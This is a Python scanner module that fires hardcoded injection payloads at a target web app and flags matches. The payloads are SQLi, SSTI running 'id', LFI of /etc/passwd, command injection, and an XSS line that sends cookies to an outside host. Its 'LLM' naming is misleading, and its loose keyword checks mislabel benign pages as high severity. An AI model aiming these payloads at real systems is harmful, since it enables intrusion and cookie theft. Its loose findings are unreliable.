import json
import asyncio
from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

LLM_TECH_PROMPTS = {
    "django": [
        {"type": "sqli", "payload": "'; SELECT * FROM auth_user --"},
        {"type": "ssti", "payload": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"},
    ],
    "flask": [
        {"type": "ssti", "payload": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"},
        {"type": "debug", "payload": "/console"},
    ],
    "express": [
        {"type": "prototype_pollution", "payload": '{"__proto__": {"admin": true}}'},
        {"type": "xss", "payload": "<script>fetch('http://xss.detect/'+document.cookie)</script>"},
    ],
    "spring": [
        {"type": "spel", "payload": "${7*7}"},
        {"type": "actuator", "payload": "/actuator/env"},
    ],
    "laravel": [
        {"type": "debug", "payload": "/_debugbar"},
        {"type": "deser", "payload": "O:1:\"A\":0:{}"},
    ],
    "rails": [
        {"type": "mass_assignment", "payload": "user[admin]=1"},
        {"type": "yaml", "payload": "--- !ruby/object:ERB"},
    ],
    "wordpress": [
        {"type": "xss", "payload": "<script>alert(1)</script>"},
        {"type": "sqli", "payload": "' OR 1=1 --"},
    ],
    "generic": [
        {"type": "sqli", "payload": "' OR '1'='1"},
        {"type": "xss", "payload": "<script>alert(1)</script>"},
        {"type": "ssti", "payload": "{{7*7}}"},
        {"type": "cmd", "payload": "; id"},
        {"type": "lfi", "payload": "../../etc/passwd"},
    ],
}

CONTEXT_AWARE_PATHS = {
    "sqli": ["/login", "/search", "/api/users", "/api/items"],
    "xss": ["/search", "/contact", "/feedback", "/comment"],
    "ssti": ["/profile", "/user", "/name", "/template"],
    "lfi": ["/download", "/file", "/view", "/image"],
    "cmd": ["/ping", "/exec", "/run", "/api/execute"],
    "prototype_pollution": ["/api", "/api/v1", "/api/user", "/api/update"],
    "spel": ["/api", "/api/eval", "/api/spel"],
    "mass_assignment": ["/api/user", "/api/update", "/api/register"],
}


@register_scanner(manifest=ScannerManifest(
    name="llm_payload_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=80,
    produces_tag_patterns=["llm-payload", "context-aware", "ai-generated", "adaptive"],
    produces_endpoint_types=[],
))
class LlmPayloadScanner(BaseScanner):
    name = "llm_payload_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        base = target.url.rstrip("/")

        tech_signatures = ["django", "flask", "express", "spring", "laravel", "rails", "wordpress"]

        detected_techs = []
        for tech in tech_signatures:
            try:
                resp = await client.get(base)
                self._stats["requests"] += 1
                body = (resp.text or "").lower()
                headers_str = str(resp.headers).lower()
                if tech == "django" and ("csrftoken" in headers_str or "django" in body):
                    detected_techs.append(tech)
                elif tech == "flask" and ("flask" in headers_str or "flask" in body):
                    detected_techs.append(tech)
                elif tech == "express" and ("x-powered-by: express" in headers_str or "express" in body):
                    detected_techs.append(tech)
                elif tech == "spring" and ("spring" in body or "spring" in headers_str):
                    detected_techs.append(tech)
                elif tech == "laravel" and ("laravel" in body or "laravel_session" in headers_str):
                    detected_techs.append(tech)
                elif tech == "rails" and ("rails" in body or "_rails" in headers_str):
                    detected_techs.append(tech)
                elif tech == "wordpress" and ("wp-content" in body or "wp-json" in body):
                    detected_techs.append(tech)
            except Exception:
                continue

        if not detected_techs:
            detected_techs = ["generic"]

        for tech in detected_techs:
            probes = LLM_TECH_PROMPTS.get(tech, LLM_TECH_PROMPTS["generic"])
            for probe in probes:
                paths = CONTEXT_AWARE_PATHS.get(probe["type"], ["/"])
                for path in paths:
                    url = f"{base}{path}"
                    payload = probe["payload"]

                    for method in ("GET", "POST"):
                        try:
                            if method == "POST":
                                resp = await client.post(url,
                                    data={"input": payload, "q": payload, "name": payload},
                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                                    follow_redirects=False,
                                )
                            else:
                                resp = await client.get(f"{url}?q={payload}&input={payload}",
                                    follow_redirects=False,
                                )
                            self._stats["requests"] += 1
                            body = (resp.text or "").lower()

                            if any(kw in body for kw in
                                   ["root:", "uid=", "49", "7*7", "passwd",
                                    "alert", "console.log", "error", "exception",
                                    "stack trace", "admin"]):
                                ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                                endpoints.append(ep)
                                findings.append(self.make_finding(
                                    title=f"LLM Context-Aware Payload — {probe['type'].upper()} ({tech})",
                                    description=f"Context-aware {probe['type']} payload for {tech} at {url} returned suspicious content.",
                                    severity=FindingSeverity.HIGH.value,
                                    endpoint=ep,
                                    evidence={
                                        "url": url,
                                        "tech": tech,
                                        "attack_type": probe["type"],
                                        "payload": payload,
                                        "body_preview": body[:200],
                                    },
                                    confidence=0.6,
                                    tags=["llm-payload", tech, probe["type"], "context-aware", "adaptive"],
                                ))
                        except Exception:
                            self._stats["errors"] += 1

        return findings, endpoints
